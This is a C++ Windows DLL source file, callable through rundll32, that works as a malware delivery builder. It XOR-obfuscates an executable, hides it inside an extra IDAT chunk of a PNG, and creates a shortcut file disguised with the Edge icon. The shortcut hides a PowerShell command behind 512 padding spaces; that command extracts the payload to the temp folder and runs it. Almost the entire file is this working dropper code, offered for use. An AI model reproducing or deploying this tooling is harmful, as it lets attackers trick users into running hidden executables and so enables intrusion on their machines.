#include "pch.h"

#ifdef EMBEDPE_DLL_EXPORTS
#define EMBEDPE_API __declspec(dllexport)
#else
#define EMBEDPE_API __declspec(dllimport)
#endif

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <wincon.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <wincrypt.h>
#include <sstream>
#include <iomanip>
#include <comdef.h>
#include <objbase.h>
#include <shobjidl.h>

// Link required libraries
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32.lib")

// PNG file signature and chunk definitions
const BYTE PNG_SIGNATURE[] = { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A };
const BYTE IDAT[] = { 0x49, 0x44, 0x41, 0x54 };
const BYTE IEND[] = { 0x00, 0x00, 0x00, 0x00, 0x49,
                       0x45, 0x4E, 0x44, 0xAE,
                       0x42, 0x60, 0x82 };

// Default icon path/index (Edge)
const std::wstring DFLT_ICON = L"%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe";
const int          DFLT_ICON_INDX = 11;

// --------------------------------------
// Console color helpers
// --------------------------------------
static void SetConsoleColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

static void PrintRed(const std::wstring& message) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::wcout << message << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

static void PrintYellow(const std::wstring& message) {
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::wcout << message << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

static void PrintCyan(const std::wstring& message) {
    SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::wcout << message << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

// --------------------------------------
// Additional helpers
// --------------------------------------

// Generate a random string using C++ random facilities.
static std::wstring GenerateRandomString(int length) {
    const wchar_t letters[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::wstring result;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, (sizeof(letters) / sizeof(wchar_t)) - 2);
    for (int i = 0; i < length; ++i) {
        result += letters[dist(gen)];
    }
    return result;
}

// XOR each byte of the input data with the provided key.
static std::vector<BYTE> XorInputData(const std::vector<BYTE>& data, BYTE key) {
    std::vector<BYTE> result(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key;
    }
    return result;
}

// Expand environment variables (e.g. %ProgramFiles(x86)%) in a string.
static std::wstring ExpandEnvironment(const std::wstring& path) {
    wchar_t buffer[MAX_PATH];
    DWORD result = ExpandEnvironmentStringsW(path.c_str(), buffer, MAX_PATH);
    if (result == 0 || result > MAX_PATH) {
        return path;
    }
    return std::wstring(buffer, result - 1);
}

// Removes a given number of bytes from the end of a file.
static bool RemoveBytesFromEnd(const std::wstring& file_path, DWORD bytes_to_remove) {
    HANDLE hFile = CreateFileW(file_path.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return false;

    LARGE_INTEGER file_size;
    if (!GetFileSizeEx(hFile, &file_size)) {
        CloseHandle(hFile);
        return false;
    }
    if (file_size.QuadPart < bytes_to_remove) {
        CloseHandle(hFile);
        return false;
    }
    LARGE_INTEGER new_size;
    new_size.QuadPart = file_size.QuadPart - bytes_to_remove;
    if (!SetFilePointerEx(hFile, new_size, NULL, FILE_BEGIN)) {
        CloseHandle(hFile);
        return false;
    }
    if (!SetEndOfFile(hFile)) {
        CloseHandle(hFile);
        return false;
    }
    CloseHandle(hFile);
    return true;
}

// Creates a .lnk shortcut that runs powershell.exe with the specified arguments.
static bool CreateShortcut(const std::wstring& lnk_path,
    const std::wstring& arguments,
    const std::wstring& icon_file,
    int icon_index,
    const std::wstring& working_dir,
    int window_style)
{
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        return false;
    }

    IShellLinkW* pShellLink = nullptr;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
        IID_IShellLinkW, (LPVOID*)&pShellLink);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }

    hr = pShellLink->SetPath(L"powershell.exe");
    if (FAILED(hr)) {
        pShellLink->Release();
        CoUninitialize();
        return false;
    }

    hr = pShellLink->SetArguments(arguments.c_str());
    if (FAILED(hr)) {
        pShellLink->Release();
        CoUninitialize();
        return false;
    }

    std::wstring expanded_icon = ExpandEnvironment(icon_file);
    hr = pShellLink->SetIconLocation(expanded_icon.c_str(), icon_index);
    if (FAILED(hr)) {
        pShellLink->Release();
        CoUninitialize();
        return false;
    }

    hr = pShellLink->SetWorkingDirectory(working_dir.empty() ? L"." : working_dir.c_str());
    if (FAILED(hr)) {
        pShellLink->Release();
        CoUninitialize();
        return false;
    }

    hr = pShellLink->SetShowCmd(window_style);
    if (FAILED(hr)) {
        pShellLink->Release();
        CoUninitialize();
        return false;
    }

    IPersistFile* pPersistFile = nullptr;
    hr = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
    if (FAILED(hr)) {
        pShellLink->Release();
        CoUninitialize();
        return false;
    }

    hr = pPersistFile->Save(lnk_path.c_str(), TRUE);
    pPersistFile->Release();
    pShellLink->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}

// Simple CRC32 calculation for a block of data.
// (This is a basic implementation; for production code consider an optimized version.)
static DWORD CalculateCRC(const std::vector<BYTE>& data) {
    DWORD crc = 0xFFFFFFFF;
    for (BYTE b : data) {
        crc ^= b;
        for (int i = 0; i < 8; i++) {
            if (crc & 1)
                crc = (crc >> 1) ^ 0xEDB88320;
            else
                crc = crc >> 1;
        }
    }
    return ~crc;
}

// Embeds the PE into a PNG file by removing its IEND chunk and appending a new IDAT chunk
// containing the XOR-obfuscated payload.
static int PlantPEInPNG(const std::wstring& input_png,
    const std::wstring& output_png,
    const std::vector<BYTE>& pe_data)
{
    if (!CopyFileW(input_png.c_str(), output_png.c_str(), FALSE)) {
        PrintRed(L"[!] Failed to copy input PNG");
        return -1;
    }

    int  xor_key_offset = 0;
    BYTE xor_key = 0;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(100, 450);

    // Pick an offset where the byte is non-zero to serve as the XOR key.
    do {
        xor_key_offset = dist(gen);
        HANDLE hFile = CreateFileW(output_png.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            PrintRed(L"[!] Failed to open output PNG");
            return -1;
        }
        LARGE_INTEGER li;
        li.QuadPart = xor_key_offset;
        if (!SetFilePointerEx(hFile, li, NULL, FILE_BEGIN)) {
            CloseHandle(hFile);
            PrintRed(L"[!] Failed to seek to XOR key offset");
            return -1;
        }
        DWORD bytes_read = 0;
        if (!ReadFile(hFile, &xor_key, 1, &bytes_read, NULL) ||
            bytes_read != 1)
        {
            CloseHandle(hFile);
            PrintRed(L"[!] Failed to read XOR key");
            return -1;
        }
        CloseHandle(hFile);
    } while (xor_key == 0);

    std::wcout << L"[i] Using XOR Key [0x" << std::hex << (int)xor_key
        << L"] at Offset: " << std::dec << xor_key_offset << std::endl;

    std::vector<BYTE> xored_buffer = XorInputData(pe_data, xor_key);

    // Remove the IEND chunk from the PNG.
    if (!RemoveBytesFromEnd(output_png, sizeof(IEND))) {
        PrintRed(L"[!] Failed to remove IEND");
        return -1;
    }

    // Open the output PNG for appending the new chunk.
    HANDLE hOutput = CreateFileW(output_png.c_str(),
        FILE_APPEND_DATA,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hOutput == INVALID_HANDLE_VALUE) {
        PrintRed(L"[!] Failed to open output PNG for appending");
        return -1;
    }

    DWORD chunk_length = static_cast<DWORD>(xored_buffer.size());
    std::vector<BYTE> chunk_length_bytes = {
        (BYTE)(chunk_length >> 24),
        (BYTE)(chunk_length >> 16),
        (BYTE)(chunk_length >> 8),
        (BYTE)(chunk_length)
    };

    // Build IDAT chunk data: chunk type ("IDAT") + XOR-obfuscated payload.
    std::vector<BYTE> idat_chunk;
    idat_chunk.insert(idat_chunk.end(), IDAT, IDAT + 4);
    idat_chunk.insert(idat_chunk.end(), xored_buffer.begin(), xored_buffer.end());

    DWORD crc = CalculateCRC(idat_chunk);
    std::vector<BYTE> crc_bytes = {
        (BYTE)(crc >> 24),
        (BYTE)(crc >> 16),
        (BYTE)(crc >> 8),
        (BYTE)(crc)
    };

    // Final chunk data: length, type, data, and CRC.
    std::vector<BYTE> idat_section;
    idat_section.insert(idat_section.end(), chunk_length_bytes.begin(), chunk_length_bytes.end());
    idat_section.insert(idat_section.end(), IDAT, IDAT + 4);
    idat_section.insert(idat_section.end(), xored_buffer.begin(), xored_buffer.end());
    idat_section.insert(idat_section.end(), crc_bytes.begin(), crc_bytes.end());

    DWORD bytes_written = 0;
    if (!WriteFile(hOutput, idat_section.data(), static_cast<DWORD>(idat_section.size()),
        &bytes_written, NULL) ||
        bytes_written != idat_section.size())
    {
        CloseHandle(hOutput);
        PrintRed(L"[!] Failed to write IDAT section");
        return -1;
    }

    // Re-append the standard IEND chunk to the PNG.
    if (!WriteFile(hOutput, IEND, (DWORD)sizeof(IEND), &bytes_written, NULL) ||
        bytes_written != sizeof(IEND))
    {
        CloseHandle(hOutput);
        PrintRed(L"[!] Failed to append IEND");
        return -1;
    }

    CloseHandle(hOutput);
    return xor_key_offset;
}

// Builds the PowerShell extraction command that will read the PNG, extract the payload,
// de-obfuscate it, write it to a temporary file, and execute it.
static std::wstring CreateLnkExtractionCommand(int xor_key_offset,
    const std::wstring& output_png,
    const std::wstring& input_pe)
{
    bool is_dll = false; // If needed, you can check the PE header to determine this.
    int nameLength = 4 + (rand() % 5);
    std::wstring output_pe_filename = GenerateRandomString(nameLength) + (is_dll ? L".dll" : L".exe");

    std::wcout << L"[i] Payload Will Be Executed As: %TEMP%\\" << output_pe_filename << std::endl;

    // Construct the PowerShell command.
    std::wstringstream ss;
    ss << L"$data=[System.IO.File]::ReadAllBytes('" << output_png << L"');"
        << L"$key=$data[" << xor_key_offset << L"];"
        << L"$file=Join-Path $env:TEMP '" << output_pe_filename << L"';"
        << L"$i=[System.Text.Encoding]::ASCII.GetString($data).LastIndexOf('IDAT')+4;"
        << L"$xdata = $data[$i..($data.Length-1)] | ForEach-Object { $_ -bxor $key };"
        << L"[System.IO.File]::WriteAllBytes($file, $xdata);"
        << L"Start-Process $file";

    return ss.str();
}

// ---------------------------------------------------------------------------
// The only EXPORTED function, designed to be called via rundll32.exe:
//   void CALLBACK RunEmbedPERunDLL(HWND, HINSTANCE, LPSTR, int)
// ---------------------------------------------------------------------------
extern "C"
__declspec(dllexport)
void CALLBACK RunEmbedPERunDLL(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    // Convert ANSI command line (lpszCmdLine) to a wide string.
    std::wstring wideCmd;
    if (lpszCmdLine) {
        int needed = MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, nullptr, 0);
        if (needed > 1) {
            wideCmd.resize(needed - 1);
            MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, &wideCmd[0], needed);
        }
    }

    // Simple space-splitting parser (this does not handle quotes or escape sequences)
    std::vector<std::wstring> tokens;
    {
        std::wstringstream ss(wideCmd);
        std::wstring temp;
        while (ss >> temp) {
            tokens.push_back(temp);
        }
    }

    // Expecting parameters: -i <input_pe> -png <input_png> -o <output_base>
    std::wstring input_pe, input_png, output_base;
    for (size_t i = 0; i + 1 < tokens.size(); ++i) {
        if (_wcsicmp(tokens[i].c_str(), L"-i") == 0) {
            input_pe = tokens[i + 1];
            i++;
        }
        else if (_wcsicmp(tokens[i].c_str(), L"-png") == 0) {
            input_png = tokens[i + 1];
            i++;
        }
        else if (_wcsicmp(tokens[i].c_str(), L"-o") == 0) {
            output_base = tokens[i + 1];
            i++;
        }
    }

    // Validate required parameters.
    if (input_pe.empty() || input_png.empty() || output_base.empty()) {
        PrintRed(L"Usage (rundll32): rundll32.exe <dll>,RunEmbedPERunDLL -i <input_pe> -png <input_png> -o <output_base>");
        return;
    }

    std::wstring olnk_fname = output_base + L".lnk";
    std::wstring opng_fname = output_base + L".png";

    // Read the PE file from disk.
    HANDLE hFile = CreateFileW(input_pe.c_str(),
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintRed(L"Failed to read PE file");
        return;
    }
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        PrintRed(L"Failed to get PE file size");
        return;
    }
    std::vector<BYTE> pe_data(file_size);
    DWORD bytes_read = 0;
    if (!ReadFile(hFile, pe_data.data(), file_size, &bytes_read, NULL) || bytes_read != file_size) {
        CloseHandle(hFile);
        PrintRed(L"Failed to read PE file");
        return;
    }
    CloseHandle(hFile);

    // Embed the PE into the PNG.
    int xor_key_offset = PlantPEInPNG(input_png, opng_fname, pe_data);
    if (xor_key_offset == -1) {
        PrintRed(L"Failed to embed PE into PNG");
        return;
    }
    PrintYellow(L"[*] " + opng_fname + L" is created!");

    // Build the PowerShell extraction command.
    std::wstring extraction_command = CreateLnkExtractionCommand(xor_key_offset, opng_fname, input_pe);

    // Prepend overflow spaces if desired (may be used to bypass certain limitations).
    std::wstring overflow(512, L' ');
    std::wstring full_command = overflow + extraction_command;

    // Create the .lnk shortcut.
    if (!CreateShortcut(olnk_fname, full_command, DFLT_ICON, DFLT_ICON_INDX, L"", SW_SHOWMINNOACTIVE)) {
        PrintRed(L"Failed to create LNK file");
        return;
    }

    PrintYellow(L"[*] " + olnk_fname + L" is created!");
}

// Simple DllMain; no special initialization is needed.
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Optional: Initialize resources here.
        break;
    case DLL_PROCESS_DETACH:
        // Optional: Clean up resources here.
        break;
    }
    return TRUE;
}
